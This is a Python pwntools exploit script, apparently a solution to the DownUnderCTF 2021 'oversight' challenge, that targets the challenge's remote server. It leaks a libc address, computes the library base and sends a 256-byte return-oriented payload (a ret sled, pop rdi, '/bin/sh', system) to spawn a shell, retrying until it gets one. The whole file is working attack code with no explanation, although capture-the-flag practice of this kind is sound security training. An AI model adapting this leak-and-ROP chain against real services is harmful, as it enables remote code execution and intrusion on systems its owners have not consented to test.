#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./oversight')

while True:
	if args.REMOTE:
		p = remote('pwn-2021.duc.tf', 31909)
		libc = ELF('./libc-2.27.so')
		libc_start_main_offset = 231
	else:
		p = process(binary.path)
		libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
		libc_start_main_offset = 243

	try:
		p.sendline()
		p.sendlineafter(b'number: ',b'27')
		p.recvuntil(b'Your magic number is: ')
		libc.address = int(p.recvline().strip().decode(),16) - libc.sym.__libc_start_main - libc_start_main_offset
		log.info('libc.address: ' + hex(libc.address))

		pop_rdi = next(libc.search(asm('pop rdi; ret')))

		payload  = b''
		payload += ((256 - 32) // 8) * p64(pop_rdi+1) # ret sled
		payload += p64(pop_rdi)
		payload += p64(libc.search(b"/bin/sh").__next__())
		payload += p64(libc.sym.system)
		payload += (256 - len(payload)) * b'B'

		p.sendlineafter(b'(max 256)?',b'256')
		p.send(payload)
		p.recvuntil(p64(pop_rdi+1)[:6],timeout=0.5)
		p.sendline(b'echo shell')
		if b'shell' in p.recvline(timeout=1):
			p.interactive()
			break
	except:
		continue


